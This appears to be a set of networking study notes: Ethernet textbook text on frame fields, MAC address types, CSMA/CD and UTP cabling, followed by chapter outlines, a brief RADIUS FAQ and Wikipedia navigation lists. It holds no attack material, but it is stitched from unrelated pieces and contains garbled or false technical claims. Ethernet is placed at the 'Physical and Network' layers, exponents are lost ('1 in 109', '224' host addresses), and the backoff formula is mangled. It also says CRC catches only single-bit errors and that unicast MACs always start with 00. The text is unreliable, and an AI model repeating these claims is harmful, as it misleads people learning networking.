For each address type or device, specify its proper layer (Layer 2, Layer 3, or Layer 4).

Switch

Router

Gateway

MAC address

IP address

Port number

		6.1.8 Section 1.8. Review Answers
    Encapsulation

    TCP/IP, OSI, SNA, Appletalk, Novell (IPX/SPX)

    ISO/IEC 7498 and ITU-T X.200

    7, 5

    Application, Presentation, Session, Transport, Network, Data Link, Physical

    Application, Transport, Internet, Data Link, Physical

    RFCs 1122 and 1123

    Connection-mode (oriented) and connectionless-mode

    False

    True

    Layer 2, Layer 3, Layer 4, Layer 2, Layer 3, Layer 4

		6.1.9 Section 1.9. Lab Exercises

			6.1.9.1 Activity 1—Examining Encapsulation

Materials: Wireshark and a network connection

    Start a capture.

    Complete several different transactions from your computer.

    Stop the capture and examine the individual packets.

    Find examples of the following: ARP, ICMP, TCP, UDP, and IPv6.

    Describe these packets in terms of their encapsulation or protocol stacks.

			6.1.9.2 Activity 2—Protocol Distribution

Materials: Wireshark and a network connection

    Start a capture and allow it to run for several minutes, the longer the better.

    Complete as many different transactions from your computer as possible.

    From the Statistics menu in Wireshark, select Protocol Hierarchy.

    Examine the distribution or protocols and attempt to determine the models used and the level of traffic specific to each protocol. What is the most common upper-layer protocol? What caused it to be generated?

			6.1.9.3 Activity 3—Developing a Protocol/Architecture

Using the models discussed in this chapter as references, develop a series of rules or parameters that describe a conversation between two people who have never met. Things to consider might include the mode of communication, language, nonverbal communication, access method, body language, expressions, speed, and parameter negotiation.

	6.2 Chapter 2. Ethernet
Computers cabled together in a network are almost certainly going to be connected via Ethernet. Ethernet is a technology that describes the rules used for communication between LAN-based systems and is considered a Layer-2 protocol. This chapter discusses the structure and operation of the Ethernet protocol, the differences between Ethernet Type II and 802.3, cabling types, and deployment considerations.

A historical review of the current standards can be a little confusing. The story begins in the 1970s with Bob Metcalfe, who envisioned a cable-based network, which later evolved into Ethernet Type II. Shortly after Metcalfe’s ideas were disseminated, the IEEE standards committee developed 802.3 Ethernet. Both versions are in use today and are described more fully below. For the information-hungry, some interesting documents to read include:

    “Ethernet: Distributed Packet Switching for Local Computer Networks” (Metcalfe and Boggs)

    “The Ethernet: A Local Area Network Physical Layer and Data Link Layer Protocol Specifications” (DEC, Intel, and Xerox)

    “802.3-1985 IEEE Standard for Local and Metropolitan Area Networks: Carrier Sense Multiple Access with Collision Detection (Original 10Mb/s Standard)” (IEEE Standards Association)

The first paper, written by Bob Metcalfe and David Boggs, describes Ethernet as a LAN system with such characteristics as shared communication, broadcast packet switching (all nodes hear the transmission), extension via repeaters, distributed control for packet transmission, and controlled behavior in the presence of interference or collisions.

While their paper describes operation on a coaxial-based line, these properties have also been central to noncoaxial Ethernet systems. The 802.3 standard describes the communication on a network employing the carrier sense multiple access with collision detection (CSMA/CD) access method. It includes sections for aggregation, multiple speeds, and full/half duplex operation.

There have been many versions of this ubiquitous protocol, including 10Base5, 10Base2, 10Base-FL, 10Base-T, 100Base-T, and 100Base-FX. Of these, 10Base-T, 100Base-T, and 1000Base-T (gigabit) are the most common and are the focus of this chapter. Network equipment is sometimes referred to as 10/100/1000 (or 10/100), Ethernet having the capability of running at 10, 100, or 1000Mbps. The popularity of Ethernet as a LAN protocol has forced personal computer and laptop vendors to include Ethernet ports and/or auxiliary slots for Ethernet cards on all their products.
		Section 6.2.1. Remember the Models

Ethernet governs the two lowest layers (Physical and Network) of the TCP/IP model. Chapter 1 introduced RFC 1122, which requires nodes operating on a TCP/IP-based network to support the Ethernet encapsulation scheme described in RFC 894. Nodes on the network should also be able to receive frames described by RFC 1042 (IEEE 802.3 frames) and may support transmission of these frames. Today we see both types of frames coexisting on the network, but typically RFC 894 (Ethernet II) frames are generated by hosts. When an IEEE 802.3 frame appears, it is almost always from a network communication device such as a router, switch, or access point.

As previously stated, Ethernet resides at Layers 1 and 2 of the TCP/IP (or OSI) model. Layer 2 is further subdivided as shown in Figure 2-1.

The two sublayers are called Logical Link Control (LLC) and Media Access Control (MAC). The LLC sublayer is where the Ethernet frame and its associated fields are assembled and is similar to the IEEE 802.2 structure. The MAC sublayer is responsible for what is called the access method. Discussed in detail later in the chapter, the MAC sublayer detects the carrier, transmits and receives from the media, and passes frames to/from the LLC sublayer.

We know that encapsulation causes user data to be wrapped in headers from each layer in our networking model. As an example, a DHCP (BOOTP) packet is encapsulated first in UDP, followed by IP. This packet must then be placed in a LAN frame. This is true whether the network is wireless (802.11) or wired via Ethernet. Figure 2-2 shows the encapsulation concept and Figure 2-3 shows an example of an actual Ethernet Type II frame carrying the information.

                   +-------------+
                   | LLC         |
+-------------+    +-------------+
| Data link   +----+ MAC         |
+-------------+    +-------------+
| Physical    +----+ Physical    |
+-------------+    +-------------+

+---------+----+------+----------+
|         |    |      |          |
| Ethernet| IP | UDP  | DHCP     |
|         |    |      |          |
|         |    |      |          |
+---------+----+------+----------+


		Section 6.2.2. Structure

The Ethernet frame (Layer 2) in Figure 2-3 is expanded in Figure 2-4 to show several fields used to control various aspects of the transmission. When you capture traffic using Wireshark, protocols above Layer 2 are shown in their entirety. However, several parts or fields of the Layer 2 are not shown. Figure 2-4 shows a simple Ethernet frame as defined in the standard.

Figure 2-4. Ethernet fields
---------------------------------------------------------------------------------------------------------+
Preamble	Destination MAC ADDR	Source MAC ADDR		Control		Data		FCS      |                                 |
---------------------------------------------------------------------------------------------------------+
8 bytes		6 bytes			6 bytes			2 bytes		46-1500 bytes	4 bytes

	        6.2.1 Preamble

The preamble is a series of alternating 1s and 0s that provide timing for the receiving interface. The Ethernet II preamble is eight bytes in length, with each successive byte repeating the 1-0-1-0 sequence. The 802.3 frame has a seven-byte preamble with the alternating 1-0-1-0 pattern, but the eighth byte is slightly different (10101011) and is referred to as a start frame delimiter, or SFD. The preamble and the SFD are invisible to packet analyzers.

	        6.2.2 Source and Destination MAC Addresses

A MAC address (also known as the hardware, Ethernet, or physical address) is the six-byte address encoded into the network interface card (NIC) of a particular machine. The Ethernet frame has two addresses—destination and source—with the destination transmitted first. MAC addresses are used to send frames to the correct recipients on the LAN. MAC addresses have no significance beyond a computer’s own network, so the MAC addresses of machines beyond the local network are unknown. When transmitting outside the network, the MAC address of the default gateway is placed in the destination field.

	        6.2.3 Control Field (Type)

This is a two-byte field that describes what is contained in the data field. Figure 2-3 shows a value of 0x0800 following the two MAC addresses. The “0x” means that it is a hexadecimal (hex) number. The hex decode of a Wireshark capture will only show “0800,” leaving out the “0x.” The value 0800 is the most common value for this field, indicating that an IP packet is encapsulated. Another common value for this field is 0806, which indicates an Address Resolution Protocol (ARP) message. This same two-byte field in an 802.3 frame indicates the length of the data field in bytes.

	        6.2.4 Data Field

All higher layers of the protocol stack are encapsulated in the data field, or payload. All of the traffic to be sent over the network must be encapsulated into the data field of an Ethernet frame. As indicated in Figure 2-4, the minimum payload is 46 bytes and the maximum is 1500. These values are directly related to Ethernet operation. A payload of less than 46 bytes requires trailing zeros to be added to obtain the minimum of 46 bytes. An example of this is shown in Figure 2-5. However, the padding is not to be included in the length calculation for the IP packet. If the data chunk is greater than 1500 bytes, it is split up into two or more frames to be sent across the network separately.


	        6.2.5 Frame Check Sequence

The Frame Check Sequence (FCS) is the last field of the Ethernet frame and is used for error checking. A 32-bit cyclical redundancy check (CRC-32) algorithm is computed using the entire frame’s binary sequence, excluding the FCS field itself. This algorithm does error detection, but not error correction. In fact, it only checks for single bit errors. When a frame is created, the CRC calculation result is appended to the frame. Any node receiving or forwarding the frame will also calculate the CRC. The two values are compared and if they are different, an error has occurred. By default, switches calculate the CRC of each frame. A CRC error will result in the switch discarding the frame. Typically, error repair is left to the upper layers of the protocol stack or model. When errored frames are dropped, the TCP conversation will be missing packets, as indicated by out-of-order sequence numbers. Clients will ask for retransmission of the missing data.

Bit error rate (BER) refers to the number of bits that we can expect to transmit without a problem. BERs can range from 1 in 109 bits to less than 1 in 1012 on today’s high-performance networks. This means that for every 109 or 1012 bits transmitted, only 1 will be in error, causing a CRC test to fail. Even in the early Ethernet standards, the BERs were limited to 1 in 109.

		Section 6.2.3. Ethernet Type II vs. 802.3
As mentioned previously, Ethernet frames conform to two different formats. NICs and devices understand these variations and they coexist. Ethernet Type II is the standard used for IP-based data packets. IEEE 802.3 is often used with management protocols such as spanning tree. Figure 2-6 depicts the two frame types for comparison.

Example:

No.     Time            Source                Destination           Protocol Info
      8 16:38:25.872560 64.103.121.139        171.71.179.143        TCP      [TCP ACKed lost segment] 54971 > https [ACK] Seq=1 Ack=2 Win=16468 Len=0

Frame 8: 54 bytes on wire (432 bits), 54 bytes captured (432 bits)
Ethernet II, Src: IntelCor_6d:05:94 (00:24:d7:6d:05:94), Dst: All-HSRP-routers_01 (00:00:0c:07:ac:01)
    Destination: All-HSRP-routers_01 (00:00:0c:07:ac:01)
        Address: All-HSRP-routers_01 (00:00:0c:07:ac:01)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
    Source: IntelCor_6d:05:94 (00:24:d7:6d:05:94)
        Address: IntelCor_6d:05:94 (00:24:d7:6d:05:94)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
    Type: IP (0x0800)
Internet Protocol, Src: 64.103.121.139 (64.103.121.139), Dst: 171.71.179.143 (171.71.179.143)
Transmission Control Protocol, Src Port: 54971 (54971), Dst Port: https (443), Seq: 1, Ack: 2, Len: 0


The major difference between these two standards that can be seen with packet capture software is the two-byte control field. Ethernet Type II uses this as a type or protocol identifier, while 802.3 uses this field as a length value. All Ethertypes are greater than a base 10 value of 1536 (0x0600 in hexadecimal) and the most common of these are shown in Table 2-1.

+------------------+---------------+------------------------------------------------------------------+
| Hexadecimal      |     Decimal   |                            Meaning                               |
+------------------+---------------+------------------------------------------------------------------+
| 0x800            | 2048          |  IP packet                                                       |
+------------------+---------------+------------------------------------------------------------------+
| 0x806            | 2054          |  ARP packet                                                      |
+------------------+---------------+------------------------------------------------------------------+
| 0x86dd           | 35425         | IPv6                                                             |
+------------------+---------------+------------------------------------------------------------------+

A complete list can be found at the IEEE Registration Authority. The website address is given at the end of this chapter. If the base 10 value of the control field is 1500 or less, the frame is 802.3 and the control field is a length value, as shown in Figure 2-7. The standard actually considers any value below 1536 (0600 in hex) to be a length. However, RFC 1122 tells us that the maximum size of an Ethernet data field is 1500 and the maximum transmission unit (MTU) for 802.3 is 1492 bytes.

While we’re here, we might as well take a little closer look at the LLC portion of an 802.3 frame. Expanded, the LLC header provides a little more detail about the frame’s functionality. Ethernet Type II frames use the control field for this purpose. The full details of the LLC can be found in the IEEE 802.2 standard.

The general form of an LLC packet includes four fields:


Destination Service Access Point (DSAP)

    This first byte indicates the ending point or target for this frame. This address includes the individual or group bit at the beginning. An address of all ones is reserved for the global address. All zeros is a null address. A value (DSAP or SSAP) often seen on networks is AA, referring to the Subnetwork Access Protocol, or SNAP. SNAP provides support mechanisms for multiple protocols on the same Ethernet sublayer.

Source Service Access Point (SSAP)

    The second byte indicates the starting point or reason for the frame. This address includes the command/response bit at the beginning. All zeros indicates a null address.

Control

    These are values for the command and response functions, depending on the operation, as well as possible sequence numbers.

Information

    This field is the data carried by the frame. Figure 2-8 shows that the frame is carrying a Spanning Tree Protocol packet, and shows the general format for 802.3 frames with 802.2 LLC. Spanning Tree is a standard management protocol used on Ethernet networks.

+------------------------------------------+------------------------------+-------------------+
| 802.3                                    | 802.2                        |                   |
| Preamble, SFD, Dest+SRC MAC Address,     | DSAP, SSAP, CR, Control      | Spanning tree     |
+------------------------------------------+------------------------------+-------------------+


		Section 6.2.4. MAC Addresses—Another Look
Before we get into Ethernet operation, it is worth spending some time on the various MAC addresses seen on a network. These addresses can drastically affect how frames are processed. Generally, MAC addresses are divided into two parts: a three-byte vendor code and a three-byte host ID. In the example shown in Figure 2-6, the Ethernet Type II source MAC address is 00:09:11:2a:b8:00. The vendor code is 00:09:11, which corresponds to Cisco. Wireshark can interpret this value for us because the value is registered and this list is publicly available at the IEEE site. A handy lookup tool is available at http://standards.ieee.org/develop/regauth/oui/public.html. The unique value for the network node is 2a:ba:00. So, a single vendor code can have as many as 224 possible host addresses. These values are almost always written in hexadecimal notation, though the frame is transmitted in binary.

There are three different types of MAC addresses on an Ethernet network: unicast, broadcast, and multicast. Unicast MAC addresses are those assigned to individual nodes, and the first byte is always 00. In an Ethernet frame, the source MAC address is always a unicast address. Figure 2-9 shows a unicast-to-unicast communication. That means the source and destination addresses both begin with 00 and correspond to individual machines. We call this a unicast frame. In the case of the destination, the vendor code is 00:19:55 and the unique node ID is 35:1a:d0.

Figure 2-9. Unicast Ethernet frame


Broadcast frames are those sent by a single node (unicast address) to everyone on the local network. This special hexadecimal address (ff-ff-ff-ff-ff-ff) is used for several different messages, but a couple of the most common are ARP and DHCP requests. A hexadecimal value of ff corresponds to a base 10 value of 255. Figure 2-10 shows a broadcast frame.

Figure 2-10. Broadcast Ethernet frame


Broadcast frames are read by all nodes on a network. They are also forwarded everywhere by Layer-2 networking equipment. When a switch receives a broadcast frame, it is sent out every port except the one through which the frame arrived. Routers will not forward broadcast frames. Routers are said to be the boundary of the broadcast domain. In fact, routers generally do not forward Layer-2 frames to other networks. Stated another way, no network but your own will ever see the MAC addresses used on your network.

Multicast frames are created by a single host (unicast) but destined for a subset of the entire network. Multicast is important when a message must be sent to a particular process or group of nodes. One example might be the wireless equipment on a network. A controller or node might send out a multicast frame that reaches all devices with a particular vendor code. Another example is the Spanning Tree Protocol. Switches engaging in the Spanning Tree Protocol send and receive frames with a particular reserved multicast address. Nodes ignore this address. Multicast frames will have 01 as the first byte of the MAC address.

The example in Figure 2-11 is a spanning tree frame called a bridge protocol data unit. The source address is a unicast and the destination is 01:80:2c:00:00:00, which corresponds to the MAC address reserved for spanning tree. This is an 802.3 Ethernet frame rather than an Ethernet Type II frame.

		Section 6.2.5. Ethernet Operation
If you imagine yourself as a computer trying to communicate on a network fully populated with a large number of other computers, you might discover that there are a significant number of issues associated with trying to be understood. For example:

    How would you ensure the correct destination received the transmission?

    How would you determine how fast or how slow you were supposed to send the data?

    How would you decide which computers had permission to speak or transmit?

These issues are similar to having a conversation with a group of your friends. Who is talking? For how long? Can we interrupt? Like many conversations with our friends, some topologies are easier to manage than others. For these reasons, every single LAN protocol has a set of rules.

As a protocol, Ethernet is pretty straightforward. As for the first issue, Ethernet uses MAC addresses to uniquely identify the network nodes. When a frame is transmitted, the recipient is specified in the Ethernet header. Moving to the second issue, data rate is a function of the NIC. NICs are normally capable of two or three speeds, including 10Mbps, 100Mbps, and 1Gbps. So either the NIC negotiates an acceptable data rate with the network or the NIC will use an incoming frame’s preamble to help it sync up with the incoming transmission.

The third issue is a little more complicated. Before a node can transmit, it must determine if the wire or medium is clear for transmission. This is handled via the access method. Specifically, Ethernet uses CSMA/CD along with a truncated binary exponential random backoff algorithm. It’s quite a mouthful, but simpler than it sounds. First, the node will listen for other transmissions. “Hearing” none, it will assume the medium is clear and begin its own transmission. If the line is not clear, the node waits for the transmission to complete and then sends its own frame.

		Section 6.2.6. Shared Media
Early Ethernet operated on a bus topology, meaning every node on the network can hear what you transmitted and vice versa. In fact, early generations such as 10Base5 and 10Base2 actually connect nodes together via coaxial cables and tap into the central shared conductor. The next generation was called 10Base-T and dropped the use of coaxial cable in favor of unshielded twisted pair (UTP) as the media, but it is still a bus. The naming convention (10Base-T) is described in 802.3 and indicates the speed (10, 100, or 1000Mbps), type of transmission (baseband or broadband), and the type of media or distance, T indicating twisted pair. Earlier standards such as 10Base5 use the trailing number as a distance value to indicate the maximum network diameter. For example, 10Base5 has a maximum collision domain distance of 500m.

In a UTP-based bus topology, all of the transmissions use the same pair of wires. The transmission eventually winds up on the receive pair of wires for every single node. The central node is a hub or repeater. With bus topologies, if two separate transmissions are initiated at the same time, they will collide somewhere on the network, causing a spike in voltage or power (Figure 2-12). Just like vehicular collisions, Ethernet frame collisions are bad. In the event of a collision, the two nodes involved must back off from the transmission and try again later.

Figure 2-12. Collision on a hub-based topology


Network nodes can detect when a collision occurs, because their NICs have transmit and receive wire pairs. Thus, if a signal is detected on your receive wires while you were transmitting, another node must be transmitting at the same time. The frames have collided with yours and the collision now propagates to the receive pair. Normally, a frame from a single node will effectively “fill up” the entire network for the duration of the transmission, ensuring all other network nodes will remain quiet.

To ensure we can detect all possible collisions, regardless of when the transmission started, we have rules that must be obeyed regarding frame size, bit rate, and maximum network diameter. Ethernet frames must be a minimum of 64 bytes in length (recall that the data field can range in size from 46 to 1500 bytes) measured from the destination MAC address field to the CRC field, as shown in Figure 2-13.

Figure 2-13. Ethernet minimum frame size


The minimum size restriction prevents the generation and transmission of very small frames. A 10Base-T network is limited to 500m end to end. The goal is to prevent a node from transmitting the last bit of a frame before the first bit arrives at the destination. If we allowed the network size to exceed the limit, or if we transmitted really small frames, it would be possible for the entire frame to leave the NIC and then get destroyed in the network. Violation of these restrictions makes it possible for a transmitting node to finish putting a frame onto the network before the leading edge of the frame reaches its destination. Should a collision occur, the transmitting node will have no idea that its own frame was involved in the collision. At the other extreme, nodes with large frames may monopolize the network.

Any node capable of detecting a collision is a member of the same collision domain. A collision domain is the distance that collision electrical noise travels. Hubs will forward collisions, but switches and routers will not. More on these devices can be found in the Chapter 5.

The Ethernet standard includes guidelines for the construction of shared (bus topology) Ethernet networks. A 10Base-T network should follow a 3-4-5 rule—three populated segments, four repeaters or hubs, and a maximum distance of five hundred meters (Figure 2-14). The rule imposes a maximum distance between any two Ethernet UTP endpoints of 100 meters.

Figure 2-14. 3-4-5 rule for 10Base-T Ethernet


For 100Base-T (the 100Mbps upgrade for 10Base-T), we use the 1-2 rule, which means that only one repeater or hub is allowed and the maximum network diameter is two hundred meters. This rule allows either translational or nontranslational hubs. Nontranslational hubs do not convert between media types. An exception to the 1-2 rule is adding a second hub if it is nontranslational (Class II) and placed close by the other hub, as in a wiring closet. The Ethernet standard specifies that, “It must be possible [for] any two DTEs on that network to contend for the network at the same time.”

Remember that these rules are for shared Ethernet, meaning hubs, bus topologies, and a broadcast system. The minute a device like a switch is used, these rules go out the window, because the network behavior changes. On a practical note, today’s networks are usually built with switches, so these rules serve as background. However, Ethernet default configuration settings are typically aligned with the shared network mentality.

We know that Ethernet has a minimum frame size of 64 bytes, or 512 bits. A frame of this size on a 10Base-T network (10 million bits per second) takes 51.2µsec to transmit. This is referred to as the slot time. If a node has a frame to transmit, it must listen to the media for at short period of time called the interframe gap. This minimum wait time prevents transmitting into a frame already on the network and allows station a chance to reset. An interframe gap (time distance between two frames) of 96 bits (9.6µsec) also prevents a node from transmitting one frame after another. For 100Base-T, the interframe gap is shortened to .96µsec. The slot time is also shorter, based on the faster transmission time of each bit. Just for fun, 1000Base-T has a slot time of .096µsec and a corresponding drop in slot time.

When the media is free and the wait is over, a frame may be sent via the transmit pair. If a spike in voltage or power (a collision) is detected on the receive pair while the frame is being transmitted, the stations involved in the collision know that their frames were destroyed, because they were obeying the minimum frame size rules. The transmitters now have two tasks—first, they issue a 32-bit jam signal to ensure all devices are aware of the collision, then they back off and wait for another chance to transmit.

Here is where the truncated binary exponential backoff algorithm comes in. The backoff time is dependent upon the following formula, where r is a random integer between the two values and n is the number of transmission attempts:

    (0 > r >2k) * slot time
    k = min (n, 10)

If, after sixteen attempts, a node does not manage a transmission, it stops trying.

		Section 6.2.7. Physical Layer
So far we’ve discussed the operation and framing of Ethernet from Layer 2 of the protocol stack. The Physical Layer specifies the electrical and mechanical properties such as voltage levels, encoding schemes, and the connectors. On a practical note, users are given limited options when configuring a network. We no longer use NICs that have different types of connector. Connectors are almost always RJ45 terminations for UTP. Before we look at the electrical details, it is worth spending some time on the cabling and connectors. It turns out that this is where we make many of our mistakes.

			6.2.5.1 
Cabling

UTP wiring is the most common network media type and is used for VoIP phones, Token Ring, FDDI, Ethernet, and many others. UTP describes the construction of the actual wiring. That is, eight conductors, twisted into four pairs, with nothing but plastic protecting the copper from the environment. The conductor size is American Wire Gauge (AWG) 22-26. The RJ45 jack (male or female) has eight pins for these connections and a locking tab to keep it secure in the outlet.

Figure 2-15 shows both the male and female RJ45 jacks. On the male, pins 1 is at the top and is connected to the orange pair along with pin 2. In the female jack, pin 1 is on the right. UTP cabling is tested for performance and given a rating, or category, based on this performance. The standard categories and some of their performance ratings are given in Table 2-2.

Figure 2-15. RJ45 male and female ends


Table 2-2. Cable specifications
 	Attenuation (insertion loss)	Reflection	Near end crosstalk	Max frequency
Category 5	22dB	15.1dB	32.3dB	100MHz
Category 5e	22dB	20.1dB	35.3dB	100MHz
Category 6	19.8dB	20.1dB	44.3dB	250MHz


Note:

Values given in Table 2-2 are for 100MHz operation and there are differences between cable types. Additionally, Category 3 cables are not rated for performance at these frequencies.

As the category number increases, so does the range of frequencies that can be sent over the cable. This means a greater data rate and improved performance. These improvements are due largely to the change in the construction of the cable. The biggest physical difference is in the number of twists per inch in each pair of conductors. The higher the number of twists, the better the cable is at avoiding crosstalk and interference problems. Figure 2-16 shows the differences between early Category 3 (Cat 3) cable through Category 5e (Cat 5e) to Category 6 (Cat 6).

Figure 2-16. Cable construction comparison


A close look at Figure 2-16 reveals several interesting characteristics about the cable construction. First, Cat 3 cables (top) have very few twists when compared to the others. In fact, 3–5 twists per foot is the standard. Cat 5e has 3–5 twists per inch and if we look closely we can see that the individual pairs have different twist densities. Cat 6 cable (bottom) can have even more twists, but may add the plastic separator and the bond the pairs together. These make the cable an excellent transmission medium, although it makes life more difficult for the cable installer when terminating cables manually, as the pairs typically have to be separated.

In addition to categories, individual conductors can be manufactured differently. Permanent cabling (horizontal cabling) is installed in the wall connecting the female jack to the wiring closet distribution frame. This cabling is fabricated using solid copper for each of the eight individual conductors. Patch cables connect your computer to the wall jack and make connections in the data closet. Patch cables are constructed using stranded copper. If you were to take one of the eight conductors and strip off the insulation, you would see many small strands of copper rather than one thicker piece. This stranding makes the cable more flexible and therefore less likely to break than solid core, but it increases the attenuation of the signal it carries. For this reason, we usually like to keep the patch cables as short as possible. These differences can be seen in Figure 2-17.

Figure 2-17. Stranded vs. solid core cable


Both permanent cabling and patch cables are straight-through, which means that pin 1 on one end goes to pin 1 on the other and so on. These connections follow the EIA/TIA 568 cabling standards. For data networks, we are actually concerned with EIA568B, while telecommunications networks generally employ EIA568A. A straight-through data cable is terminated on both ends using 568B.

At the Physical Layer, Ethernet uses only pins 1, 2, 3, and 6 for transmission and reception (Table 2-3).

Table 2-3. Ethernet pin usage
1	Tx+
2	Tx−
3	Rx+
6	Rx−


Pins 4 and 5 can be used to handle traditional telephone connections and the telephone jack (RJ11 style) fits right into the center of an RJ45. In addition, modern communications often deploy power over Ethernet, or PoE. This also runs over unused connectors. Power over Ethernet is standardized in IEEE 802.3af and 802.3at. These standards describe the method and electrical characteristics used to energize devices such as VoIP phones and access points over the unused pairs of the Ethernet cable. This is a much more convenient solution than installing power outlets everywhere.

In addition to categories and construction, there are several different nonpermanent cable types used on a network, including straight-through, crossover, and rollover. They all use the same stranded copper, but the pins don’t always start and end in the same place. Standard straight-through patch cables are used to connect a computer to a hub or switch. However, they do not work when connecting computers directly together or when interconnecting some network devices. A standard patch cable is likely a stranded, Category 5e, straight-through (568B to 568B) data cable terminated with RJ45 jacks. But most people just call it an Ethernet cable, even though the exact same cable might be used for a Token Ring network or a VoIP phone.

A crossover cable allows two computers or two switches to be connected directly together by crossing the receive wires to the transmit lines. A crossover cable is terminated using 568B on one end and 568A on the other. To simplify things, we can look at the orange and green pairs. Table 2-4 depicts the mapping, or pinouts, of 568A and 568B.

Table 2-4. 568A and B pins
T568A for patch cable	T568B for patch cable
Pin	Wire color	Pin	Wire color
1	White/green	1	White/orange
2	Green	2	Orange
3	White/orange	3	White/green
4	Blue	4	Blue
5	White/blue	5	White/blue
6	Orange	6	Green
7	White/brown	7	White/brown
8	Brown	8	Brown


This crossing is normally handled by the switch or hub.

When a network administrator configures a device such as a router, it is often accomplished via a rollover cable connected to a console port. A rollover cable maps pin 1 to pin 8, pin 2 to pin 7, pin 3 to pin 6, and pin 4 to pin 5. We use these cables to connect from a computer serial (COM) port to a switch/router console port, and EIA232 is used for communication. When connecting a DB9 serial port to a router console port, the rollover cable is connected to a terminal adapter that converts the RJ45 wiring to DB9. Often, these cables come premade with the conversion built in. Figure 2-18 shows networks utilizing the various cable types.

The top image in Figure 2-18 shows two computers directly connected to each other. The required cable is an Ethernet crossover. The same is true of the switch-to-switch connection if an uplink port is not present. The straight-through Ethernet patch cables are running between the computer and the switch. There is also a straight-through cable between the router and the switch. Finally, the management station is connected to the router console port via a rollover cable. Of course, ports on newer devices negotiate many of the cross connections for us, but we’re better off knowing how things work.

Figure 2-18. Connection and cable types

			6.2.5.2

		Section 6.2.8. Encoding
		Section 6.2.9. Other Types of Signaling
		Section 6.2.10. Topologies
		Section 6.2.11. Final Thoughts on Ethernet
		Section 6.2.12. Reading
		Section 6.2.13. Summary
		Section 6.2.14. Review Questions
		Section 6.2.15. Review Answers
		Section 6.2.16. Lab Exercises

Section 3.1. Protocol Description

Section 3.2. Structure

Section 3.3. Addressing

Section 3.4. Operation

Section 3.5. Digging a Little Deeper...What Addressing is Sufficient?

Section 3.6. Security Warning

Section 3.7. Organizations for Assigning Addresses and Names

Section 3.8. Standards and RFCs

Section 3.9. Summary

Section 3.10. Review Questions

Section 3.11. Lab Exercises
Download ChapterDownload Chapter
1 TokenChapter 4. Address Resolution Protocol

Section 4.1. The Problem

Section 4.2. Techniques

Section 4.3. Protocol Description

Section 4.4. Structure

Section 4.5. Addressing in the ARP Request

Section 4.6. Addressing in the ARP Reply

Section 4.7. Operation

Section 4.8. Additional Operations

Section 4.9. Security Warning

Section 4.10. IPv6

Section 4.11. Digging a Little Deeper

Section 4.12. Standards and RFCs

Section 4.13. Summary

Section 4.14. Review Questions

Section 4.15. Review Answers

Section 4.16. Lab Activities
Download ChapterDownload Chapter
1 TokenChapter 5. Network Equipment

Section 5.1. Tables and Hosts

Section 5.2. Hubs or Repeaters

Section 5.3. Switches and Bridges

Section 5.4. Access Points

Section 5.5. Routers

Section 5.6. Multilayer Switches and Home Gateways

Section 5.7. Security

Section 5.8. Summary

Section 5.9. Review Questions

Section 5.10. Review Answers

Section 5.11. Lab Activities
Download ChapterDownload Chapter
1 TokenChapter 6. Internet Control Message Protocol

Section 6.1. Structure

Section 6.2. Operations and Types

Section 6.3. Digging a Little Deeper—the One’s Complement

Section 6.4. IPv6

Section 6.5. Summary

Section 6.6. Additional Reading

Section 6.7. Review Questions

Section 6.8. Review Answers

Section 6.9. Lab Activities
Download ChapterDownload Chapter
1 TokenChapter 7. Subnetting and Other Masking Acrobatics

Section 7.1. How Do We Use the Mask?

Section 7.2. What Is a Subnet?

Section 7.3. Subnet Patterns

Section 7.4. Subnet IP Addressing

Section 7.5. A Shorthand Technique

Section 7.6. The Effect on Address Space

Section 7.7. Theory vs. Reality

Section 7.8. Supernetting

Section 7.9. The Supernetted Network

Section 7.10. Classless Inter-Domain Routing

Section 7.11. CIDR and Aggregation Implementation

Section 7.12. Summary

Section 7.13. RFCs and Reading

Section 7.14. Review Questions

Section 7.15. Review Answers

Section 7.16. Lab Activities

7. Packet Guide to Routing and Switching

	7.1 Routing and Switching Strategies

		7.1. Switching: Forwarding and Filtering Traffic
		7.2. Routing: Finding Paths
		7.3. IPv6
		7.4. Reading
		7.5. Summary
		7.6. Review Questions
		7.7. Review Answers
		7.8. Lab Activities

	7.2 Host Routing

The Decision Process

Host Routing Tables

Addressing

Tracking the Packets

Reading

Summary

Review Questions

Review Answers

Lab Activities
Download ChapterDownload Chapter
1 Token3. Spanning Tree and Rapid Spanning Tree

Why Are Loops Bad?

The Structure of Spanning Tree BPDUs

The Operation of Spanning Tree

Spanning Tree Messages

Cisco Improvements

VLANs and Spanning Tree

The Rapid Spanning Tree Protocol

Security

Reading

Summary

Review Questions

Review Answers

Lab Activities
Download ChapterDownload Chapter
1 Token4. VLANs and Trunking

Problem: Big Broadcast Domains

What Is a VLAN?

What is a Trunk?

VLAN Design Considerations

Reading

Summary

Review Questions

Review Answers

Lab Activities
Download ChapterDownload Chapter
1 Token5. Routing Information Protocol

Version 1 Versus Version 2

Protocol Description

Structure

Basic Operation

Advanced Operation

How Do I Get Off of My Network?

RIP and Loops

Security

RIP and IPv6

Reading

Summary

Review Questions

Review Answers

Lab Activities
Download ChapterDownload Chapter
1 Token6. Open Shortest Path First

Protocol Description

Being Link State

Structure and Basic Operation

Advanced Operation

OSPF and IPv6

Reading

Summary

Review Questions

Review Answers

Lab Activities

8. RADIUS

	8.1 FAQ

		8.1.1 Value of Calling-station-id ?

- dial-up it is the caller-id  10:54 AM 
- 802.1x, EAP ->  MAC
  10:54 AM 
- tunnelling/CLI from NAS  - can be IP address.  
		8.1.2

	8.2 RADIUS From Wikipedia, the free encyclopedia
For other uses, see Radius (disambiguation).
Internet protocols
Application layer

    DHCP
    DHCPv6
    DNS
    FTP
    HTTP
    IMAP
    IRC
    LDAP
    MGCP
    NNTP
    NTP
    POP
    RPC
    RTP
    RTSP
    RIP
    SIP
    SMTP
    SNMP
    SOCKS
    SSH
    Telnet
    TLS/SSL
    XMPP
    (more)

Transport layer

    TCP
    UDP
    DCCP
    SCTP
    RSVP
    (more)

Internet layer

    IP
        IPv4
        IPv6
    ICMP
    ICMPv6
    OSPF
    BGP
    ECN
    IGMP
    IPsec
    (more)

Link layer

    ARP/InARP
    NDP
    Tunnels
        L2TP
    PPP
    Media access control
        Ethernet
        DSL
        ISDN
        FDDI
    (more)

    v
    t
    e

